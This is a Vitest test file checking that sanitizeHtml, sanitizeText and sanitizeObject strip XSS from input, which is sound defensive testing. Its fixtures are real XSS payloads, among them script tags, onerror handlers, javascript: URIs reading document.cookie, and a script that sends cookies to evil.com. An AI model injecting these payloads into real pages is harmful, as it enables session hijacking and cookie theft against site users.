import { describe, it, expect } from 'vitest';
import { sanitizeHtml, sanitizeText, sanitizeObject } from '../sanitization';

describe('XSS Sanitization & DOMPurify Security Utilities (TDD)', () => {
  describe('sanitizeHtml', () => {
    it('should strip script tags and inline scripts completely', () => {
      const malicious = '<p>Hello <script>alert("XSS")</script>World</p>';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('Hello');
      expect(clean).toContain('World');
    });

    it('should remove event handlers like onerror and onload from tags', () => {
      const malicious = '<img src="invalid.jpg" onerror="alert(\'hacked\')" onload="doEvil()" />';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('onload');
      expect(clean).not.toContain('alert');
    });

    it('should neutralize javascript: and vbscript: URIs in links and iframe sources', () => {
      const maliciousLink = '<a href="javascript:alert(document.cookie)">Click Me</a>';
      const cleanLink = sanitizeHtml(maliciousLink);
      expect(cleanLink).not.toContain('javascript:');

      const maliciousIframe = '<iframe src="javascript:alert(1)"></iframe>';
      const cleanIframe = sanitizeHtml(maliciousIframe);
      expect(cleanIframe).not.toContain('javascript:');
    });

    it('should preserve safe HTML formatting tags like b, i, strong, em, ul, li, p, br', () => {
      const safe =
        '<p><strong>Important:</strong> Please review <em>notes</em>.<br></p><ul><li>Item 1</li></ul>';
      const clean = sanitizeHtml(safe);
      expect(clean).toEqual(safe);
    });
  });

  describe('sanitizeText', () => {
    it('should strip all HTML tags and return plain text', () => {
      const input = '<div onclick="alert(1)">Just plain text <b>here</b></div>';
      const output = sanitizeText(input);
      expect(output).not.toContain('<div');
      expect(output).not.toContain('<b>');
      expect(output).not.toContain('onclick');
      expect(output).toContain('Just plain text here');
    });

    it('should handle null, undefined, or non-string inputs safely without crashing', () => {
      expect(sanitizeText(null as unknown as string)).toBe('');
      expect(sanitizeText(undefined as unknown as string)).toBe('');
      expect(sanitizeText(12345 as unknown as string)).toBe('12345');
    });
  });

  describe('sanitizeObject', () => {
    it('should recursively sanitize all string properties in objects and arrays (AI metadata, CMS, notes)', () => {
      const dirtyMetadata = {
        scanId: 'scan-101',
        userNote:
          '<script>fetch("http://evil.com/steal?cookie=" + document.cookie)</script>My Waste Pickup Note',
        details: {
          category: 'PLASTIC <img src=x onerror=alert(1)>',
          tags: ['recyclable', '<iframe src=javascript:alert(1)>'],
          confidence: 0.98,
        },
      };

      const cleanMetadata = sanitizeObject(dirtyMetadata);

      expect(cleanMetadata.scanId).toBe('scan-101');
      expect(cleanMetadata.userNote).not.toContain('<script>');
      expect(cleanMetadata.userNote).not.toContain('fetch');
      expect(cleanMetadata.userNote).toContain('My Waste Pickup Note');
      expect(cleanMetadata.details.category).not.toContain('onerror');
      expect(cleanMetadata.details.category).toContain('PLASTIC');
      expect(cleanMetadata.details.tags[1]).not.toContain('iframe');
      expect(cleanMetadata.details.tags[1]).not.toContain('javascript:');
      expect(cleanMetadata.details.confidence).toBe(0.98);
    });
  });
});
